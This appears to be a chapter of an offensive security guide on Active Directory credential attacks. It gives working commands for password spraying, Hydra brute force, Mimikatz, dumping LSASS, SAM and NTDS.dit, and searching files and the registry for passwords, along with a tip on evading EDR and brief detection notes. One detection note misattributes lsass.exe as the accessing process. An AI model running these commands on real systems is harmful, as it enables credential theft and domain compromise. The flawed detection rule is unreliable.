# Chapter 5: Credential Attacks

Credential attacks are a primary method for gaining initial access or escalating privileges in an Active Directory environment. These attacks target user accounts, service accounts, and the underlying authentication mechanisms to harvest passwords, hashes, or tickets.

## Password Spraying

Password spraying is an attack where an attacker attempts to authenticate against multiple accounts using a few common passwords, rather than targeting a single account with many passwords (brute force).

### How it works
- **Low and Slow**: The attack uses a single password (or a small list of passwords) against many users.
- **Avoids Lockouts**: By limiting attempts per account, it stays below the account lockout threshold.

### Example using Kerbrute

Kerbrute is a tool that uses Kerberos pre-authentication to spray passwords without generating logon events.

```bash
# Using Kerbrute
kerbrute passwordspray -d <DomainName> --dc <DomainController> userlist.txt password123
```

### Example using CrackMapExec

```bash
# Using CrackMapExec (SMB)
crackmapexec smb <TargetIP> -u userlist.txt -p 'Password1' --continue-on-success
```

## Brute Force

Brute force attacks involve systematically trying all possible combinations of characters until the correct password is found. In AD environments, brute force is generally ineffective and easily detected due to account lockout policies.

### Example using Hydra

```bash
# Using Hydra against RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TargetIP>
```

## Credential Stuffing

Credential stuffing is the automated injection of stolen username and password pairs (credentials) into websites, in an attempt to gain unauthorized access to user accounts. This relies on the fact that users often reuse passwords across multiple services.

### Mitigation
- Enforce Multi-Factor Authentication (MFA).
- Use password managers.

## Password Policies

Active Directory enforces password policies to prevent weak credentials.

### Default Policy
- Minimum password length: 7 characters
- Password must meet complexity requirements: On
- Maximum password age: 42 days

### Fine-Grained Password Policies (FGPP)
FGPP allows administrators to apply different password policies to different users or groups within the same domain.

### Example using PowerShell

```powershell
# Viewing Password Policy
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *
```

## Cached Credentials

When a domain-joined computer cannot contact a Domain Controller (e.g., a laptop is off the network), it caches the user's credentials locally to allow logon.

### How it works
- The credentials are stored in the registry under `HKLM\SECURITY\Cache`.
- The number of cached credentials is controlled by the `CachedLogonsCount` policy (default is 10).

### Example using Mimikatz

```text
# Mimikatz
mimikatz # logonpasswords
mimikatz # lsadump::cache
```

## LSASS Dumping

The Local Security Authority Subsystem Service (LSASS) stores credentials in memory to facilitate single sign-on. Dumping LSASS memory is the most common method for extracting plaintext passwords, NTLM hashes, and Kerberos tickets.

### Example using Mimikatz

```text
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Example using procdump

Using `procdump` (a legitimate Sysinternals tool) can sometimes bypass Endpoint Detection and Response (EDR) solutions.

```cmd
# Command Prompt
procdump -ma lsass.exe lsass.dmp
```

### Example using PowerShell

```powershell
# PowerShell (using comsvcs.dll)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

## SAM Dumping

The Security Accounts Manager (SAM) database stores local user credentials. While it doesn't contain domain credentials, local admin accounts are often reused across the network.

### Example using reg.exe

```cmd
# Command Prompt
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

### Example using Mimikatz

```text
# Mimikatz
mimikatz # lsadump::sam
```

## NTDS Extraction

The NTDS.dit file is the Active Directory database file that contains all objects, including users, groups, and their password hashes. Extracting NTDS.dit provides the attacker with all domain credentials.

### Example using ntdsutil

```cmd
# Command Prompt (requires Domain Admin privileges)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
```

### Example using secretsdump.py

```bash
# Using Impacket
secretsdump.py -just-dc-ntlm -outputfile ntds_hashes <Domain>/<User>:<Password>@<DomainController>
```

## Credential Discovery

Credential discovery involves searching local machines for hardcoded passwords in files, scripts, or registry keys.

### Searching for Passwords in Files

```powershell
# PowerShell
findstr /si password *.txt *.xml *.ini
```

### Searching in Registry

```powershell
# PowerShell
reg query HKLM /f password /t REG_SZ /s
```

## Detection Notes

- **LSASS Dumping**: Look for Event ID 10 (Process Access) in Windows logs where `SourceImage` is `lsass.exe` and `GrantedAccess` is `0x1FFFFF` (full access).
- **Password Spraying**: Look for multiple Event ID 4625 (Logon failure) across many different accounts from a single source IP.
- **NTDS Extraction**: Monitor for the execution of `ntdsutil.exe` or unusual access to the `C:\Windows\NTDS\NTDS.dit` file.

---
*Credential attacks provide the keys to the kingdom. The next chapter will explore the underlying authentication protocols that govern how these credentials are used and verified.*
